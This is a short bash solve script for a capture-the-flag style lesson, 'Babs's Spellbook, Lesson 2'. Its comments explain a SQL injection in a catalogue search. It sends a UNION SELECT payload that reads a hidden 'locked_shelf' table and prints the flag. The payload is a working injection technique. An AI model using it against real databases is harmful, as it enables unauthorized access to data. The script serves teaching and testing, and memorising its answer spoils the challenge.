#!/usr/bin/env bash
# Babs's Spellbook, Lesson 2: The Misfiled Spellbook - automated solve.
# $TARGET is "host port".
#
# The catalogue interpolates the search term:
#   SELECT title, description FROM spells WHERE title LIKE '%<search>%'
# The locked shelf has the same two columns, so a UNION reaches around the
# WHERE clause and appends its row to the results. The trailing quote is
# commented out.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30002}"

search="' UNION SELECT title, description FROM locked_shelf --"
flag=$(python3 solution/one-shot.py "$host" "$port" 2 "$search")

[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
